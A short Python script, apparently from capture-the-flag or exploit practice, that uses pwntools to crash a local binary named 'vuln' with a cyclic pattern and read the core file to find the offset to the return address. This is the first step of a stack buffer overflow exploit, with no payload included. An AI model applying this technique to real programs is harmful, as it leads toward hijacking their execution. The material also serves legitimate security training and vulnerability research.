from pwn import *

io = process("./vuln")
print(io.recvregex(b'!')) # read until we get the prompt
io.sendline(cyclic(500))
io.wait()
core = io.corefile
rsp = core.rsp
info("rsp = %#x", rsp)
pattern = core.read(rsp, 4)
rip_offset = cyclic_find(pattern)
info("rip offset is %d", rip_offset)
